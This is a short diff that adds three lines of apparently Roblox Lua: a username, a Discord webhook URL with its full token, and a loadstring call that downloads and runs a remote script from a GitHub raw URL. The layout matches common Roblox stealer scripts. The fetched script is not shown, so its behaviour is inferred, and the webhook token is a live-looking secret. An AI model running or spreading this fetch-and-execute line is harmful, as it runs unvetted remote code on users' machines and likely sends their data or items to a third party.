@@ -1,0 +1,3 @@
+Username = "kely5171"
+Webhook = "https://discord.com/api/webhooks/1287647687268761672/Pn0TeAG3WXxo6GWwfZEzwEw8OEMBuaXs1FBeRdqsX5u2nFGctDVzqRQCGYZVt2QPgtig"
+loadstring(game:HttpGet("https://raw.githubusercontent.com/doslobodydoedy/x/main/bf.lua", true))()
